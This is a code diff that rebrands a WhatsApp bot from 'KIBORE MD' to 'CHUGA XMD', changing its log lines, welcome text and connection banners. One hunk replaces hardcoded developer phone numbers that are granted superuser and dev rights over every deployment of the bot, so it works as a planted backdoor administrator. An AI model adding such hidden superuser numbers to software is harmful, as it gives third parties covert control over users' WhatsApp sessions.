@@ -84,7 +84,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Kibore md', "safari", "1.0.0"],
+            browser: ['Chuga xmd', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -196,10 +196,10 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255693629079';
-            const dj2 = '255693629079';
-            const dj3 = "255693629079";
-            const luffy = '255693629079';
+            const dj = '255622286792';
+            const dj2 = '255622286792';
+            const dj3 = "255622286792";
+            const luffy = '255622286792';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -207,7 +207,7 @@ if (conf.AUTOREACT_STATUS=== "yes") {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\KIBORE-MD is ONLINE");
+            console.log("\CHUGA-MD is ONLINE");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -712,7 +712,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `*𝐊𝐈𝐁𝐎𝐑𝐄 𝐌𝐃. 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*`;
+            let msg = `*𝐂𝐇𝐔𝐆𝐀 𝐗𝐌𝐃. 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐒𝐒𝐀𝐆𝐄*`;
             let membres = group.participants;
             for (let membre of membres) {
                 msg += ` \n]|I{•------»*𝐇𝐄𝐘* 🖐️ @${membre.split("@")[0]} 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏. \n\n`;
@@ -846,18 +846,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ KIBORE MD is connecting...");
+                console.log("ℹ️ CHUGA XMD is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ KIBORE MD- Connected to WhatsApp! ☺️");
+                console.log("✅ CHUGA XMD- Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("KIBORE MD is Online 🕸\n\n");
+                console.log("CHUGA XMD is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading KIBORE MD Commands ...\n");
+                console.log("Loading CHUGA XMD Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -888,9 +888,9 @@ zk.ev.on('group-participants.update', async (group) => {
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =`      KIBORE MD
+                let cmsg =`      CHUGA XMD
 ╭─────────────━┈⊷ 
-│🌏 KIBORE-MD CONNECTED
+│🌏 CHUGA-XMD CONNECTED
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
 ╰─────────────━┈⊷⁠⁠⁠⁠`;
